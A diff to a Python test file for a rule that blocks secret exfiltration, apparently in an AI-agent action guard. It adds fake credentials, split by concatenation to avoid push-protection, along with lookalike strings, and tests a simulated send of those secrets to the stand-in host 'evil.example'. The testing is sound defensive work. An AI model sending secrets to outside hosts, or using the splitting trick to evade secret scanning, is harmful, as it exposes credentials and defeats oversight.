@@ -27,6 +27,39 @@ FAKE_AWS = "AKIAIOSFODNN7EXAMPLE"  # noqa: S105
 FAKE_OPENAI = "sk-" + "EXAMPLE0000000000000000000000000000"  # noqa: S105
 FAKE_GITHUB = "ghp_" + "EXAMPLE000000000000000000000000000000"  # noqa: S105
 
+# Additional synthetic credentials (NOT real secrets). Built via `+` so GitHub
+# push-protection does not flag the literals (same trick as FAKE_OPENAI above);
+# the runtime value still matches the rule's regex, the source text does not
+# contain a contiguous secret-shaped token.
+FAKE_JWT = (  # noqa: S105
+    "ey" + "Jhbz0iOiJIUzI1NiJ9" + ".ey" + "JzdWIiOiJFWEFNUExFIn0" + ".EXAMPLEsig0123456789"
+)
+FAKE_STRIPE = "sk" + "_live_" + "EXAMPLE0123456789abcdef99"  # noqa: S105
+FAKE_GH_PAT = "github" + "_pat_" + "EXAMPLE0123456789ABCDEF_AA"  # noqa: S105
+FAKE_SLACK_HOOK = (  # noqa: S105
+    "https://hooks.slack.com/services/" + "T0EXAMPLE1/" + "B0EXAMPLE2/" + "EXAMPLEwebhook0123456789"
+)
+FAKE_SENDGRID = "SG" + ".EXAMPLEabcdef0123456789" + ".EXAMPLE_ABCDEFGHIJ0123456789klmnop"  # noqa: S105
+FAKE_NPM = "npm" + "_" + "EXAMPLE" + "0123456789abcdefABCDEF0123456"  # noqa: S105
+FAKE_DB_URI = "postgres://" + "dbuser:" + "EXAMPLEpass123" + "@db.internal:5432/app"  # noqa: S105
+
+NEW_CREDENTIALS = [
+    FAKE_JWT,
+    FAKE_STRIPE,
+    FAKE_GH_PAT,
+    FAKE_SLACK_HOOK,
+    FAKE_SENDGRID,
+    FAKE_NPM,
+    FAKE_DB_URI,
+]
+# Strings that RESEMBLE but are NOT strong credentials — must never strong-block.
+BENIGN_LOOKALIKES = [
+    "https://user:pass@example.com/path",  # http URL creds, not a DB URI scheme
+    "a1b2c3d4e5f60718293a4b5c6d7e8f9012345678",  # 40-hex git commit SHA
+    "550e8400-e29b-41d4-a716-446655440000",  # a UUID
+    "the words sk live and npm appear here but not as keys",
+]
+
 
 def _action(action_type, *, target=None, dest=None):
     return SecurityObject(
@@ -81,6 +114,32 @@ def test_benign_content_passes():
     action = _action(ActionType.file_write, target="frontend/Button.tsx")
     result = RULE.evaluate(action, _ctx(path="frontend/Button.tsx", content="export const x = 1"))
     assert result.verdict is Verdict.PASS
+
+
+@pytest.mark.parametrize("secret", NEW_CREDENTIALS)
+def test_expanded_credentials_block_on_exfiltration(secret):
+    # A newly-covered credential type sent to an external destination → BLOCK.
+    action = _action(
+        ActionType.network_request,
+        target="https://evil.example/c",
+        dest="https://evil.example/c",
+    )
+    result = RULE.evaluate(action, _ctx(url="https://evil.example/c", body=f"data: {secret}"))
+    assert result.verdict is Verdict.BLOCK
+    assert ReasonCode.secret_exfiltration in result.reason_codes
+
+
+@pytest.mark.parametrize("text", BENIGN_LOOKALIKES)
+def test_benign_lookalikes_do_not_secret_block_on_exfiltration(text):
+    # Strings that resemble but are NOT strong credentials must not trigger a
+    # secret-exfiltration BLOCK — no over-blocking benign external sends.
+    action = _action(
+        ActionType.network_request,
+        target="https://example.com/c",
+        dest="https://example.com/c",
+    )
+    result = RULE.evaluate(action, _ctx(url="https://example.com/c", body=f"value: {text}"))
+    assert ReasonCode.secret_exfiltration not in result.reason_codes
 
 
 def test_local_secret_file_read_is_auth_not_block():
